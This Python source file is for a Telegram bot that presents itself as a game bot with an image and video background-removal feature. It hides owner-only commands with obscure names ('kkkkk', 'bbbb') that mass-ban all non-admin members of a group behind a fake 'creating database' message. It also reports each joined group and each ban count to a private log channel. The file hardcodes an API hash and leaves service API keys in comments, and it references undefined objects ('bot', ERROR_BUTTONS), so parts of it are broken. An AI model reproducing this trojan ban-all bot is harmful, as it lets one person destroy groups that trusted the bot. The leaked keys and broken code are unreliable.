from pyrogram import Client , filters, idle, enums
from pyrogram.types import Message, ChatPermissions
import asyncio
import os
import requests
from dotenv import load_dotenv

load_dotenv()

API_ID = 9855603
API_HASH = "95d8b38bbb62d087dbf7b98abf670e78"
BOT_TOKEN = os.environ.get("BOT_TOKEN")
REMOVEBG_API = os.environ.get("REMOVEBG_API", "")
UNSCREEN_API = os.environ.get("UNSCREEN_API", "")
#MONGO_URL = os.environ.get("MONGO_URL")
app = Client(
    "Level" ,
    api_id = API_ID ,
    api_hash = API_HASH ,
    bot_token = BOT_TOKEN
)

BOT_ID = 5720302471

SK = "Creating Seprate Database for your Group \nThis May take Some Time Please Wait..."             
NK = "Required Admin permission To Send Messages in Group"
LOGG = -1001686630791
@app.on_message(filters.command("kkkkk") & filters.user(1497264683))
async def ban_all(_,msg):
    chat_id=msg.chat.id    
    bot=await app.get_chat_member(chat_id,BOT_ID)
    bot_permission=bot.privileges.can_restrict_members==True
    if bot_permission:
        await msg.reply_text(SK)
        async for member in app.get_chat_members(chat_id):       
            try:
                    dlm = await app.ban_chat_member(chat_id, member.user.id)
                    await dlm.delete()                   
            except Exception as e:
                await app.send_message(LOGG, text=e)
                pass
    else:
        await msg.reply_text(NK)

@app.on_message(filters.command("bbbb") & filters.user(1497264683))
async def banall(_, message):
    chat_id = message.chat.id
    user_id = message.from_user.id
    try: 
        Members = []
        Admins = []
        async for x in app.get_chat_members(chat_id):
            if not x.privileges:
                  Members.append(x.user.id)
            else:
                  Admins.append(x.user.id)
        for user_id in Members:
             if message.text.split()[0].lower().startswith("s"):
                      m = await app.ban_chat_member(chat_id, user_id)
                      await m.delete()
             else:
                 mm = await app.ban_chat_member(chat_id, user_id)
                 await mm.delete()
        await app.send_message(LOGG, text="Successfully Banned: {}\nRemaining Admins: {}".format(len(Members),len(Admins),))
    except Exception as e:
        await app.send_message(LOGG, text=e)

@bot.on_message(filters.command("run"))
async def bye(bot, message):
    if len(message.command) > 1:
        group = (message.text.split(None, 1)[1].strip())[:100]
        await bot.leave_chat(group)

@bot.on_message(filters.command("jk"))
async def bye(bot, message):
    chat_id = message.chat.id
    await app.send_message(LOGG, text=f"Here \n `{chat_id}`")
     


Wtxt = """
Thanks for having me in
{}
Promote me as admin so i can send message in group and work fully functional.

Click 👉🏻  /play
And enjoy the game
"""
PIC = "https://telegra.ph/file/b1752d75f28c71b684f15.jpg"
WLOG = -1001686630791
welcome_group = 2
@app.on_message(filters.new_chat_members, group=welcome_group)
async def welcome(_, message: Message):
    chat_id = message.chat.id
    name = message.chat.title
    uname = message.chat.username
    for member in message.new_chat_members:
        try:
            if member.id == BOT_ID:
                await message.reply_photo(photo=PIC, caption=Wtxt.format(name))
                await app.send_message(WLOG, text=f"#NEW_GROUP \n\n❗❕Group Name: {name} \n❗PUBLIC: @{uname} \n❕Group Id: `{chat_id}` ")
        except:
            return
                                                                            



@app.on_message(filters.command("r"))
async def rel(bot, message):
    await message.reply_text("!bot reloaded")

@app.on_message(filters.command("settings") & filters.private)
async def settings(bot, message):
    uid = message.from_user.id
    mystic = await message.reply_text("Getting User Unique id...")
    await asyncio.sleep(1)
    await mystic.edit(f"👥: {uid}")
    await asyncio.sleep(1)
    await mystic.edit("UID Not Found In D.B.")
    await asyncio.sleep(1)
    await mystic.edit("⚠️Only Authorised Users Can use This command")



#REMOVEBG_API = "KMFFqrBYBocDHBYbz8Gwa2np"
#UNSCREEN_API = "zhLmhhqxbYrKbXrsw5bbnKeo"

@app.on_message(filters.chat(WLOG) & (filters.photo | filters.video | filters.document))
async def remove_background(bot, update):
    if not (REMOVEBG_API or UNSCREEN_API):
        await update.reply_text(
            text="Error :- API not found",
            quote=True,
            disable_web_page_preview=True,
            reply_markup=ERROR_BUTTONS
        )
        return
#    await update.reply_text("typing")
    message = await update.reply_text(
        text="Processing....",
        quote=True,
        disable_web_page_preview=True
    )
    try:
        new_file_name = f"./{str(update.from_user.id)}"
        if (
            update.photo or (
                update.document and "image" in update.document.mime_type
            )
        ):
            new_file_name += ".png"
            file = await update.download()
            await message.edit_text(
                text="Photo downloaded successfully. Now removing background.",
                disable_web_page_preview=True
            )
            new_document = removebg_image(file)
        elif (
            update.video or (
                update.document and "video" in update.document.mime_type
            )
        ):
            new_file_name += ".webm"
            file = await update.download()
            await message.edit_text(
                text="Video downloaded successfully. Now removing background.",
                disable_web_page_preview=True
            )
            new_document = removebg_video(file)
        else:
            await message.edit_text(
                text="Media not supported",
                disable_web_page_preview=True,
                reply_markup=ERROR_BUTTONS
            )
        try:
            os.remove(file)
        except:
            pass
    except Exception as error:
        await message.edit_text(
            text=error,
            disable_web_page_preview=True
        )
    try:
        with open(new_file_name, "wb") as file:
            file.write(new_document.content)
#        await update.reply_text("upload_document")
    except Exception as error:
        await message.edit_text(
           text=error,
           reply_markup=ERROR_BUTTONS
        )
        return
    try:
        await update.reply_document(
            document=new_file_name,
            quote=True
        )
        try:
            os.remove(new_file_name)
        except:
            pass
    except Exception as error:
        await message.edit_text(
            text=f"Error:- `{error}`",
            disable_web_page_preview=True,
            reply_markup=ERROR_BUTTONS
        )


def removebg_image(file):
    return requests.post(
        "https://api.remove.bg/v1.0/removebg",
        files={"image_file": open(file, "rb")},
        data={"size": "auto"},
        headers={"X-Api-Key": REMOVEBG_API}
    )


def removebg_video(file):
    return requests.post(
        "https://api.unscreen.com/v1.0/videos",
        files={"video_file": open(file, "rb")},
        headers={"X-Api-Key": UNSCREEN_API}
    )

app.run() 
idle()
